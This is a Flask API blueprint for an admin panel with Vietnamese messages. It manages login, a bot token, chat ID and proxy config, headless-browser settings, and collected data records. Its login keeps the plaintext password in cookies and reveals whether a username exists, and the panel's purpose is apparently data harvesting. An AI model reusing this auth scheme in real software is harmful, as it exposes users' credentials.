from functools import wraps

from flask import Blueprint, jsonify, make_response, redirect, request

from .database import Account, Config, Data, Setting

app_api = Blueprint('app_api', __name__, url_prefix='/api')


def login_required(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        username = Account().get_info().get("username")
        password = Account().get_info().get("password")
        if request.cookies.get('username') == username and request.cookies.get('password') == password:
            return f(*args, **kwargs)
        response = redirect("/admin")
        response.set_cookie("username", "", max_age=0)
        response.set_cookie("password", "", max_age=0)
        response.set_cookie("is_logged_in", "", max_age=0)
        return response
    return wrap


@app_api.route("/auth/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    account = Account()
    user_info = account.get_info()
    stored_username = user_info.get("username")
    stored_password = user_info.get("password")
    if username != stored_username:
        return jsonify({"status": "error", "message": "Tên đăng nhập không tồn tại!"})
    if password != stored_password:
        return jsonify({"status": "error", "message": "Sai mật khẩu"})
    response = make_response(
        jsonify({"status": "success", "message": "Đăng nhập thành công"}))
    response.set_cookie("username", username, max_age=3600)
    response.set_cookie("password", password, max_age=3600)
    response.set_cookie("is_logged_in", "true", max_age=3600)
    return response


@app_api.route("/auth/logout", methods=["POST"])
@login_required
def logout():
    response = make_response(
        jsonify({"status": "success", "message": "Đã đăng xuất!"}))
    response.set_cookie("username", "", max_age=0)
    response.set_cookie("password", "", max_age=0)
    response.set_cookie("is_logged_in", "", max_age=0)
    return response


@app_api.route("/get-config-info", methods=["GET"])
@login_required
def get_config_info():
    config = Config()
    config_info = config.get_info()
    return jsonify(config_info)


@app_api.route("/change-config-info", methods=["POST"])
@login_required
def change_config_info():
    data = request.get_json()
    api_token = data.get("api_token")
    chat_id = data.get("chat_id")
    proxy = data.get("proxy")
    if not proxy:
        proxy = ""
    config = Config()
    config_info = config.change_info(api_token, chat_id, proxy)
    return jsonify(config_info)


@app_api.route("/get-setting-info", methods=["GET"])
@login_required
def get_setting_info():
    setting = Setting()
    account = Account()
    setting_info = setting.get_info()
    account_info = account.get_info()
    setting_info.update(account_info)
    return jsonify(setting_info)


@app_api.route("/change-setting-info", methods=["POST"])
@login_required
def change_setting_info():
    data = request.get_json()
    cookie_type = data.get("cookie_type")
    load_image = data.get("load_image")
    load_css = data.get("load_css")
    hide_chrome = data.get("hide_chrome")
    auto_close = data.get("auto_close")
    route_admin = data.get("route_admin")
    username = data.get("username")
    password = data.get("password")
    setting = Setting()
    account = Account()
    account_info = account.change_info(username, password)
    setting_info = setting.change_info(
        cookie_type, load_image, load_css, hide_chrome, auto_close, route_admin)
    setting_info.update(account_info)
    return jsonify(setting_info)


@app_api.route("/get-data", methods=["GET"])
@login_required
def get_data_info():
    data = Data()
    data_info = data.get_data()
    return jsonify(data_info)


@app_api.route("/delete-data", methods=["POST"])
@login_required
def delete_data():
    data = request.get_json()
    id = data.get("id")
    data = Data()
    data_info = data.delete_data(id)
    return jsonify(data_info)
